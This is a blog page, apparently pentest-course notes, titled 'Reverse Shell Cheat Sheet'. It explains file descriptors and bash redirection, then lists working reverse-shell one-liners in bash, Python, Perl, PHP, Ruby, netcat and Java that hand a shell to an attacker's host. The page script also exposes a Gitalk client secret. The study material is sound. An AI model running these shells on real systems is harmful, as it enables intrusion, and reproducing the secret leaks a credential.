@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    zhsh
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
+<meta name="author" content="zhsh">
+<meta name="description" content="move fast and break things">
+<meta name="keywords" content="zhsh,zhsh9,security">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://zhsh9.info/styles/main.css" />
+<link href="https://fastly.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+        <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+        <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+        <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+        <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+        
+            <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://zhsh9.info">
+                    zhsh
+                </a>
+            </div>
+            <div id="tp-weather-widget"></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        Home
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        Blog
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        Tag
+                    </a>
+                    
+                    <a class="menu-item" href="https://htbwp.readthedocs.io/en/latest/">
+                        HackTheBox
+                    </a>
+                    
+                    <a class="menu-item" href="/post/about">
+                        About
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1711375148653" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://zhsh9.info">
+                            zhsh
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1711375148653" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            Home
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            Blog
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            Tag
+                        </a>
+                        
+                        <a class="menu-item" href="https://htbwp.readthedocs.io/en/latest/">
+                            HackTheBox
+                        </a>
+                        
+                        <a class="menu-item" href="/post/about">
+                            About
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+
+    
+    <div id="tp-weather-widget"></div>
+    <script>
+      (function(a,h,g,f,e,d,c,b){b=function(){d=h.createElement(g);c=h.getElementsByTagName(g)[0];d.src=e;d.charset="utf-8";d.async=1;c.parentNode.insertBefore(d,c)};a["SeniverseWeatherWidgetObject"]=f;a[f]||(a[f]=function(){(a[f].q=a[f].q||[]).push(arguments)});a[f].l=+new Date();if(a.attachEvent){a.attachEvent("onload",b)}else{a.addEventListener("load",b,false)}}(window,document,"script","SeniverseWeatherWidget","//cdn.sencdn.com/widget2/static/js/bundle.js?t="+parseInt((new Date().getTime() / 100000000).toString(),10)));
+      window.SeniverseWeatherWidget('show', {
+        flavor: "slim",
+        location: "WX4FBXXFKE4F",
+        geolocation: true,
+        language: "en",
+        unit: "c",
+        theme: "auto",
+        token: "a44a1d0f-abbb-4739-a53e-603c97094c4c",
+        hover: "disabled",
+        container: "tp-weather-widget"
+      });
+      var cnt = document.getElementsByClassName('sw-card-slim-container');
+      cnt.classList.add('ignore-css');
+    </script>
+
+
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                Reverse Shell Cheat Sheet
+                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        zhsh
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2023-05-24</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">10.6
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">1698</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://zhsh9.info/tag/0cvDgZszV/">PWK</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <h1 id="comfortable-shell">Comfortable Shell</h1>
+<p>Refs:</p>
+<ul>
+<li><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README.md">the art of command line</a></li>
+</ul>
+<pre><code class="language-bash"># -l: listen, used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.
+# -v: verbose output.
+# -n: no dns, do not do any DNS or service lookups on any specified addresses, hostnames or ports.
+# -p: source port.
+rlwrap nc -lvnp $port
+
+# better shell
+dpkg -l | grep python
+python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+stty raw -echo
+export TERM=xterm-color
+</code></pre>
+<h1 id="file-descriptor">File descriptor</h1>
+<p>File descriptors are a fundamental concept in Unix-like operating systems, including Linux and macOS. They are used to identify and manipulate input/output (I/O) resources such as <code>files</code>, <code>pipes</code>, <code>sockets</code>, and <code>devices</code>.</p>
+<p>In Unix systems, everything is treated as a file, including hardware devices and network sockets. Each file has a unique file descriptor associated with it, which is a non-negative integer used to identify the file in the system. The first three file descriptors, 0, 1, and 2, are reserved for standard input (<code>stdin</code>), standard output (<code>stdout</code>), and standard error (<code>stderr</code>), respectively.</p>
+<p>The file descriptor mechanism allows processes to read from or write to files or other I/O resources using a common set of system calls, such as <code>open()</code>, <code>read()</code>, <code>write()</code>, and <code>close()</code>. By using file descriptors, processes can easily redirect their input or output to other files or pipes, or even across a network to other machines.</p>
+<p>All in all, file descriptors play a crucial role in the Unix philosophy of treating everything as a file, and provide a unified and flexible way for processes to access and manipulate I/O resources in a consistent manner.</p>
+<h1 id="shell-redirection">Shell Redirection</h1>
+<ul>
+<li><code>&gt;, &gt;&gt;, &lt;</code></li>
+<li><code>n&gt;, n&gt;&gt;</code></li>
+<li><code>&amp;&gt;, &gt;&amp; target</code> = <code>1&gt; target 2&gt;&amp;1</code>; <code>&amp;&gt;&gt;</code></li>
+<li><code>|</code></li>
+<li><code>tee</code></li>
+</ul>
+<p>Exploration:</p>
+<pre><code class="language-bash">strace -f bash -c 'bash -i /dev/tcp/127.0.0.1/4444 0&gt;&amp;1' &gt; strace.out
+cat strace.out | grep -n '127.0.0.1'
+
+# Output(version 2018):
+199: [pid  5106] socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
+200: [pid  5106] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr(&quot;127.0.0.1&quot;)}, 16) = 0
+201: [pid  5106] dup2(3, 1)                  = 1
+202: [pid  5106] close(3)                    = 0
+203: [pid  5106] dup2(1, 2)                  = 2
+204: [pid  5106] dup2(1, 0)                  = 0
+205: [pid  5106] fcntl(1, F_GETFD)           = 0
+206: [pid  5106] execve(&quot;/bin/bash&quot;, [&quot;bash&quot;, &quot;-i&quot;], 0x2485008 /* 57 vars */) = 0
+</code></pre>
+<p>Using redictions is not like connecting tubes, while <code>&gt;</code> and <code>&lt;</code> are value assignments. When <code>ls -l &gt; dir.list</code>, it is not &quot;sending&quot; the output of ls to the dir.list file. It is actually assigning the dir.list file to the standard output of ls.</p>
+<ul>
+<li><code>&gt;</code> checks if a target is available for writing</li>
+<li><code>&lt;</code> checks if a target is available for reading</li>
+</ul>
+<h1 id="sh-vs-bash-vs-zsh">sh vs bash vs zsh</h1>
+<ol>
+<li>
+<p>/bin/sh is /bin/bash ?</p>
+<ul>
+<li>
+<p>If bash is invoked with the name sh, it tries to mimic the startup behavior of historical  versions of sh as closely as possible, while conforming to the POSIX standard as well.</p>
+</li>
+<li>
+<p>When invoked as an interactive login  shell,  or  a  non-interactive shell  with the --login option, it first attempts to read and execute commands from <code>/etc/profile</code>, <code>~/.profile</code>, <code>~/.bashrc</code> and etc, in that order. The --noprofile option may be used  to inhibit this behavior.</p>
+</li>
+<li>
+<p>When invoked as an interactive shell with the name sh, bash looks for the variable ENV, expands its value  if  it  is  defined,  and  uses  the expanded value as the name of a file to read and execute.  Since a shell invoked as sh does not attempt to read and execute commands from any other startup files,  the --rcfile  option  has  no effect.  A non-interactive shell invoked with the name sh does not attempt to read any other startup files.  When invoked as sh, bash  enters posix mode after the startup files are read.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Why <code>/dev/tcp/host/port</code> not works in zsh and fish:</p>
+<ul>
+<li>
+<p>The feature is a bashism, meaning it is not a standard feature of all shells.</p>
+</li>
+<li>
+<p>Bash implements this feature by creating a socket file descriptor and redirecting it to the standard input, output, or error streams of a command. However, other shells like zsh and fish do not support this feature.</p>
+</li>
+<li>
+<p>If you need to use <code>/dev/tcp/host/port</code> in zsh or fish, you can try using the <code>nc</code> or <code>socat</code> command instead.</p>
+</li>
+</ul>
+</li>
+</ol>
+<pre><code class="language-bash"># bash
+echo hello,world &gt; /dev/tcp/127.0.0.1/4444
+# other shells:
+echo &quot;hello&quot; | nc 127.0.0.1 4444 # zsh
+echo &quot;hello&quot; | nc -c 127.0.0.1 4444 # fish
+echo &quot;hello&quot; | socat - TCP4:127.0.0.1:4444
+</code></pre>
+<h1 id="interactive-shell">Interactive Shell</h1>
+<p>Here, we mainly talk about bash. According to the Bash man page (<code>man bash</code>), option <code>-i</code> means starting an <em>interactive shell</em>.</p>
+<ul>
+<li>
+<p>In interactive mode, when Bash shell is started with the <code>-i</code> option, it sets the standard input to a terminal device (usually a terminal window) and sets the shell to read and execute commands entered by the user. This allows the user to interact with the shell and run commands in the shell, just like in a terminal window.</p>
+</li>
+<li>
+<p>In non-interactive mode, Bash shell is typically used for batch processing tasks or automation scripts. In this mode, the shell does not wait for user input but reads commands from a script or standard input. In this case, the shell usually does not have a terminal device available and cannot perform interactive operations.</p>
+</li>
+</ul>
+<h1 id="reverse-shell">Reverse Shell</h1>
+<p>Refs:</p>
+<ul>
+<li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+<li><a href="https://hypothetical.me/post/reverse-shell-in-bash/">https://hypothetical.me/post/reverse-shell-in-bash/</a></li>
+<li><a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/">https://www.gnucitizen.org/blog/reverse-shell-with-bash/</a></li>
+</ul>
+<h2 id="bash">Bash</h2>
+<pre><code class="language-bash"># 1. Host machine
+nc -lvnp 4444
+
+# 2. Remote machine
+## Method1
+bash -i &gt;&amp; /dev/tcp/$IP/4444 0&gt;&amp;1
+## Method2, conn.sh: more general
+```
+exec 5&lt;&gt;/dev/tcp/$IP/4444
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
+```
+bash conn.sh
+# This Bash script establishes a TCP connection to $IP on port $Port and associates 
+# file descriptor 5 with both input and output of the connection. It then reads data from 
+# the input of the socket, executes each line as a command, and redirects the output of 
+# the command back to the output of the socket. The purpose of this script is to give remote
+# command execution control to an attacker at $IP, who can execute arbitrary commands 
+# on the victim's system using this control.
+
+## Other shells (zsh, fish)
+</code></pre>
+<pre><code class="language-bash"># Explain the details inside this command.
+bash -i &gt;&amp; /dev/tcp/$IP/4444 0&gt;&amp;1
+</code></pre>
+<ul>
+<li>first, Bash will check if special files <code>/dev/tcp/&lt;host&gt;/&lt;port&gt;</code> are supported by your OS and if they aren’t, it will emulate them by opening a TCP connection to <code>$IP:4444</code> for you</li>
+<li>it will also <em>reassign</em> all three standard streams (stdin, stdout, and stderr)  to the socket with this new connection, so all the output will go into, and input will be read from this socket</li>
+<li>then it will start a new interactive Bash session</li>
+</ul>
+<h2 id="python">Python</h2>
+<p>Environment ok:</p>
+<ul class="contains-task-list">
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-5915232"><label class="task-list-item-label" for="task-item-5915232"> Linux/Python2.7</label></li>
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-556608"><label class="task-list-item-label" for="task-item-556608"> Kali/Python3.11.2</label></li>
+</ul>
+<p>one-line rshell:</p>
+<pre><code class="language-bash">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+<p>unfold one-line py script for easier comprehension:</p>
+<pre><code class="language-python">import socket,subprocess,os;
+# create a socket obj that uses IPv4 address family (socket.AF_INET) and TCP protocol (socket.SOCK_STREAM) for communication.
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+# establish a TCP connection with a remote host.
+# after this, the socket obj can be used to send and receive data.
+s.connect((&quot;10.0.0.1&quot;,1234));
+# duplicate the file descriptor for the socket object onto the standard input, output, and error streams of the current process
+# this allows the process to use the socket object for input and output instead of the standard streams
+os.dup2(s.fileno(),0); # s.fileno() returns the integer file descriptor associated with the socket obj s.
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+# execute a shell command (&quot;/bin/sh -i&quot;) with its standard input and output redirected to the socket object
+# this allows the attacker to execute arbitrary commands on the victim's system through the established connection
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+</code></pre>
+<h2 id="perl">Perl</h2>
+<p>one-line rshell:</p>
+<pre><code class="language-perl">perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<p>more featureful and robust rshell-file: <a href="https://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-rshell.perl</a></p>
+<h2 id="php">PHP</h2>
+<p>one-line rshell:</p>
+<p>This code assumes that the TCP connection uses file descriptor 3; if does not work, try 4, 5, 6 ...</p>
+<pre><code class="language-php">php -r '$sock=fsockopen(&quot;10.134.188.54&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<p>more featureful and robust rshell-file: <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-rshell.php</a></p>
+<h2 id="ruby">Ruby</h2>
+<pre><code class="language-ruby">ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+</code></pre>
+<h2 id="netcat">Netcat</h2>
+<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
+<pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234
+</code></pre>
+<h2 id="java">Java</h2>
+<p>Ref: <a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/">Java Reverse Shell</a></p>
+<pre><code class="language-java">r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li><a href="#comfortable-shell">Comfortable Shell</a></li>
+<li><a href="#file-descriptor">File descriptor</a></li>
+<li><a href="#shell-redirection">Shell Redirection</a></li>
+<li><a href="#sh-vs-bash-vs-zsh">sh vs bash vs zsh</a></li>
+<li><a href="#interactive-shell">Interactive Shell</a></li>
+<li><a href="#reverse-shell">Reverse Shell</a>
+<ul>
+<li><a href="#bash">Bash</a></li>
+<li><a href="#python">Python</a></li>
+<li><a href="#perl">Perl</a></li>
+<li><a href="#php">PHP</a></li>
+<li><a href="#ruby">Ruby</a></li>
+<li><a href="#netcat">Netcat</a></li>
+<li><a href="#java">Java</a></li>
+</ul>
+</li>
+</ul>
+
+                            </div>
+                            
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>zhsh</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://zhsh9.info/post/RXOBNgNUj/">https://zhsh9.info/post/RXOBNgNUj/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://zhsh9.info/post/RXOBNgNUj/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://zhsh9.info/post/RXOBNgNUj/&sharesource=qzone&title=Reverse Shell Cheat Sheet&pics=https://zhsh9.info/images/avatar.png?v=1711375148653&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://zhsh9.info/post/RXOBNgNUj/&sharesource=weibo&title=Reverse Shell Cheat Sheet + " - " + &pic="https://zhsh9.info/images/avatar.png?v=1711375148653 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://zhsh9.info/tag/0cvDgZszV/">#
+                                                PWK
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://zhsh9.info/post/jauX8izCD/">
+                                                                                            Clean Macbook Pro 2019 16inch
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://zhsh9.info/post/4Cx1M79dd/">
+                                                                                                    The Missing Semester of Your CS Education, v2020
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '11cf267617fbe2c71c94',
+        clientSecret: '3954c3a0371c9a9927394d5f3c259c3239ce6c69',
+        repo: 'zhsh9.github.io',
+        owner: 'zhsh9',
+        admin: ['zhsh9'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+                            
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        zhsh &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.6
+                </div>
+                
+                    <script>
+                        var port = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + port + '</div>')
+                    </script>
+        </footer>
+        
+                <script>
+                    
+                    
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1711375148653);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
